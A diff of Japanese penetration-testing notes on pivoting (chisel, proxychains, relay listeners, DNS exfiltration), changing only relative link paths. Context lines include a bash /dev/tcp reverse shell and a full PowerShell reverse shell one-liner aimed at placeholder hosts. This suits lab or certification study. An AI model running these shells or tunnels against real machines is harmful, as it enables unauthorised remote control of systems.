@@ -1,6 +1,6 @@
 - 関連ノート：
 	- [Port Redirection & SSH Port Forwarding](Port%20Redirection%20&%20SSH%20Port%20Forwarding.md)
-	- [53 - DNS](../../Ports%20-%20Service/53%20-%20DNS.md)
+	- [53 - DNS](../Ports%20-%20Service/53%20-%20DNS.md)
 
 ---
 
@@ -61,7 +61,7 @@ chisel client <attacker_IP>:<bind_port> R:<port|socks>:<target_IP>:<port> &
 - `R:`：
 	- target_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
 	- ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
-- `> /dev/null 2>&1 &`：エラー含むすべての入出力をリダイレクトする（[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)）
+- `> /dev/null 2>&1 &`：エラー含むすべての入出力をリダイレクトする（[スクリプト・コマンド・シェル操作](../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)）
 
 5. 成功すればchisel server(攻撃者マシン)に以下のように表示される
 ```
@@ -73,7 +73,7 @@ chisel client <attacker_IP>:<bind_port> R:<port|socks>:<target_IP>:<port> &
 # Nmap
 sudo proxychains nmap -sT -p- -Pn -n <target_IP>
 ```
-- SOCK経由のSSHアクセスの場合：[22 - SSH](../../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
+- SOCK経由のSSHアクセスの場合：[22 - SSH](../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
 - socksを使うときは `/etc/proxychains4.conf`に`socks5 127.0.0.1 1080`の設定を入れること
 - Proxychains は sudo と一緒に使う
 
@@ -160,7 +160,7 @@ session <Session_ID>
 ifconfig
 ```
 
-![](../../../画像ファイル/Pasted%20image%2020251119071530.png)
+![](../../画像ファイル/Pasted%20image%2020251119071530.png)
 
 $$ローカルNW側インターフェースが表示されている$$
 
@@ -225,7 +225,7 @@ listener_add --addr 0.0.0.0:<agent_listen_port(任意)> --to 127.0.0.1:<attacker
 listener_list
 ```
 
-![](../../../画像ファイル/Pasted%20image%2020251120124523.png)
+![](../../画像ファイル/Pasted%20image%2020251120124523.png)
 
 $$Agentが1234ポートでリッスンし、通信を攻撃者のマシンの4321ポートにリダイレクト$$
 
@@ -243,7 +243,7 @@ bash -i >& /dev/tcp/<agent_local_IP>/<agent_listen_port> 0>&1
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<agent_local_IP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 - `agent_local_IP`には内部NWインターフェースのIPを指定
-- 関連ノート：[Bind & Reverse Shell・ペイロード・安定化手法](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md)
+- 関連ノート：[Bind & Reverse Shell・ペイロード・安定化手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md)
 
 4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立される
 
@@ -327,7 +327,7 @@ Non-authoritative answer:
 <domain>      text = "<string>"
 ```
 
-![](../../../画像ファイル/Pasted%20image%2020260315104051.png)
+![](../../画像ファイル/Pasted%20image%2020260315104051.png)
 
 $$DNSリゾルバを介してデータが漏洩・侵入するイメージ$$
 
